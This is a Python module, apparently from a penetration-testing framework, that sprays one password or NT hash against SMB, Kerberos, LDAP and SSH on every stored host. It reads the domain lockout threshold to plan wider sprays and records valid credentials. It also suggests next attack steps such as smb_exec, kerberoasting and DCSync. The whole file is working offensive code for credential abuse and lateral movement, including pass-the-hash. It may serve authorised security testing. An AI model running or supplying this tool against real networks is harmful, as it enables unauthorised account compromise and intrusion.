"""Multi-protocol credential spray: one cred, every service on each host.

The engagement move after recon: you hold ONE credential and want to know
every door it opens. This module takes user:pass (or user:nthash) and
tries it against each authentication service the host runs — SMB,
Kerberos, LDAP, SSH — then tells you what to do with each hit
("smb_exec ready", "ssh user@host", ...).

Targeting is store-driven: services recorded by port_scan (or anything
else that wrote the services table) pick the protocols. Hosts with no
stored services get a quick connect-probe of the default ports first.
RHOSTS blank = every host in the store.

Lockout discipline: AD lockoutThreshold is read over LDAP (using the
spray cred itself — which also validates it once, centrally) and shown
per AD host. One cred means at most one attempt per protocol per host,
so the spray itself stays under any sane threshold — the readout exists
so you can plan WIDER sprays (login modules) against the policy. The
per-protocol attempts below are protocol minimums; the full spray
machinery (wordlists, PTH sprays, enum) lives in the
auxiliary/login/* modules.
"""

import socket

from core.module import AuxiliaryModule
from core.options import OptAddress, OptInt, OptString

try:
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1
    from impacket.krb5 import constants
    from impacket.krb5.kerberosv5 import KerberosError, getKerberosTGT
    from impacket.krb5.types import Principal
    from impacket.smbconnection import SMBConnection, SessionError
except ImportError:
    impacket_ldap = None  # console gates run() on requirements
try:
    import paramiko
except ImportError:
    paramiko = None

DEFAULT_PORTS = {"smb": 445, "kerberos": 88, "ldap": 389, "ssh": 22}
PORT_TO_PROTO = {v: k for k, v in DEFAULT_PORTS.items()}

HINTS = {
    "smb": "smb_exec ready: use exploits/windows/smb_exec",
    "kerberos": "TGT valid: kerberoast / s4u / dcsync can use this cred",
    "ldap": "LDAP bind valid: ad_enum and the enum suite can use this cred",
    "ssh": "ssh {user}@{host}",
}


def _smb_ok(host, port, domain, user, password, nthash, timeout):
    try:
        conn = SMBConnection(host, host, sess_port=port, timeout=timeout)
        try:
            if nthash:
                conn.login(user, "", domain, "", nthash)
            else:
                conn.login(user, password, domain)
            return True, "valid"
        finally:
            conn.close()
    except SessionError as e:
        return False, f"0x{int(e.getErrorCode()):08x}"
    except (OSError, EOFError) as e:
        return None, str(e)


def _kerberos_ok(host, domain, user, password, timeout):
    principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    try:
        getKerberosTGT(principal, password, domain, "", "", kdcHost=host)
        return True, "valid TGT"
    except KerberosError as e:
        return False, f"KDC 0x{int(e.getErrorCode()):x}"
    except OSError as e:
        return None, str(e)


def _ldap_ok(host, domain, user, password, timeout):
    try:
        conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
        conn.login(user, password, domain)
        return True, "valid"
    except Exception as e:
        message = str(e)
        if any(k in message.lower() for k in ("refused", "timed out",
                                              "unreachable", "connection error")):
            return None, message
        return False, message[:60]


def _ssh_ok(host, port, user, password, timeout):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=password,
                       timeout=timeout, banner_timeout=timeout,
                       auth_timeout=timeout,
                       look_for_keys=False, allow_agent=False)
        return True, "valid"
    except paramiko.AuthenticationException:
        return False, "auth failed"
    except (paramiko.SSHException, EOFError, socket.error, OSError) as e:
        return None, str(e)
    finally:
        client.close()


def _lockout_threshold(host, domain, user, password):
    """Read the domain lockoutThreshold with the spray cred's own bind.
    None when unreadable (non-AD host, anonymous disallowed)."""
    try:
        base = ",".join(f"DC={p}" for p in domain.split("."))
        conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
        conn.login(user, password, domain)
        for packet in conn.search(searchBase=base, searchFilter="(objectClass=domain)",
                                  attributes=["lockoutThreshold"]):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                for attr in packet["attributes"]:
                    if str(attr["type"]) == "lockoutThreshold":
                        return int(str(attr["vals"][0]))
    except Exception:
        pass
    return None


class MultiSpray(AuxiliaryModule):
    name = "Multi-Protocol Spray (one cred, every service)"
    description = """
        Tries ONE credential (user:pass, or user:nthash for SMB) against
        every authentication service on each host: SMB, Kerberos, LDAP,
        SSH. Targets come from the store's services table (port_scan
        first, or the default ports are probed); RHOSTS blank = every
        stored host. AD hosts get their lockoutThreshold reported for
        planning wider sprays. Hits come with next-step hints (smb_exec,
        enum, ssh).
    """
    authors = ["you"]
    requirements = ["impacket", "paramiko"]

    def register_options(self):
        self.options.add(OptString("RHOSTS", default="",
                                   description="Target host(s), comma-separated "
                                               "(blank = every host in the store)"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Single username"))
        self.options.add(OptString("PASSWORD", default="", description="Password"))
        self.options.add(OptString("NTHASH", default="",
                                   description="NT hash, hex (SMB pass-the-hash)"))
        self.options.add(OptString("DOMAIN", default=".",
                                   description="Auth domain ('.' = local)"))
        self.options.add(OptString("PROTOCOLS", default="smb,kerberos,ldap,ssh",
                                   description="Protocols to try, comma-separated"))
        self.options.add(OptInt("TIMEOUT", default=5, description="Per-attempt timeout"))

    def _hosts(self):
        raw = str(self.get_option("RHOSTS") or "").strip()
        if raw:
            return [h.strip() for h in raw.split(",") if h.strip()]
        store = getattr(self.framework, "store", None)
        if store is None:
            self.print_error("RHOSTS blank and no store attached")
            return []
        hosts = sorted({row["address"] for row in store.services()})
        if hosts:
            self.print_status(f"{len(hosts)} host(s) from the store")
        return hosts

    def _protocols_for(self, host, wanted):
        """[(proto, port)] from the store — service name first, port
        number as fallback; a connect-probe of the defaults when nothing
        is stored."""
        store = getattr(self.framework, "store", None)
        found = {}
        if store is not None:
            for row in store.services(host):
                name = (row["name"] or "").lower()
                if name in wanted:
                    found[name] = row["port"]
                elif row["port"] in PORT_TO_PROTO \
                        and PORT_TO_PROTO[row["port"]] in wanted \
                        and PORT_TO_PROTO[row["port"]] not in found:
                    found[PORT_TO_PROTO[row["port"]]] = row["port"]
        if found:
            return sorted(found.items())
        timeout = int(self.get_option("TIMEOUT"))
        probed = []
        for proto in wanted:
            port = DEFAULT_PORTS[proto]
            try:
                with socket.create_connection((host, port), timeout=timeout):
                    probed.append((proto, port))
            except OSError:
                continue
        return probed

    def run(self):
        store = getattr(self.framework, "store", None)
        wanted = [p.strip() for p in str(self.get_option("PROTOCOLS")).split(",")
                  if p.strip() in DEFAULT_PORTS]
        if not wanted:
            self.print_error(f"PROTOCOLS must be among {sorted(DEFAULT_PORTS)}")
            return
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD") or "")
        nthash = str(self.get_option("NTHASH") or "").strip()
        domain = str(self.get_option("DOMAIN") or ".")
        if not password and not nthash:
            self.print_error("set PASSWORD or NTHASH")
            return

        for host in self._hosts():
            self._spray_host(host, user, password, nthash, domain, wanted, store)

    def _spray_host(self, host, user, password, nthash, domain, wanted, store):
        protocols = self._protocols_for(host, wanted)
        if not protocols:
            self.print_error(f"{host}: no targetable services "
                             f"(wanted {', '.join(wanted)})")
            return
        names = [p for p, _ in protocols]
        self.print_status(f"{host}: spraying {user} across "
                          f"{', '.join(names)}")

        ad_flavor = any(p in names for p in ("kerberos", "ldap"))
        if ad_flavor and password and domain != ".":
            threshold = _lockout_threshold(host, domain, user, password)
            if threshold is None:
                self.print_status(f"{host}: lockoutThreshold unreadable "
                                  f"(non-AD host, or the spray cred is "
                                  f"wrong — bind failed)")
            elif threshold == 0:
                self.print_status(f"{host}: no account lockout policy")
            else:
                self.print_status(f"{host}: domain locks accounts at "
                                  f"{threshold} bad attempts — this spray "
                                  f"is {len(names)}, but plan wider "
                                  f"sprays accordingly")
        timeout = int(self.get_option("TIMEOUT"))
        attempts = {
            "smb": lambda port: _smb_ok(host, port, domain, user,
                                        password, nthash, timeout),
            "kerberos": lambda port: _kerberos_ok(host, domain, user, password,
                                                  timeout),
            "ldap": lambda port: _ldap_ok(host, domain, user, password,
                                          timeout),
            "ssh": lambda port: _ssh_ok(host, port, user, password, timeout),
        }
        for proto, port in protocols:
            if proto != "smb" and not password:
                self.print_status(f"{host} {proto}: skipped (needs PASSWORD, "
                                  f"hashes don't speak {proto})")
                continue
            ok, note = attempts[proto](port)
            if ok is True:
                hint = HINTS[proto].format(user=user, host=host)
                self.print_good(f"{host} {proto}: VALID — {hint}")
                if store is not None:
                    secret = nthash if (nthash and proto == "smb") else password
                    store.add_cred(host, proto, user, secret,
                                   source="multi_spray")
            elif ok is False:
                self.print_line(f"[-] {host} {proto}: {note}")
            else:
                self.print_error(f"{host} {proto}: transport — {note}")
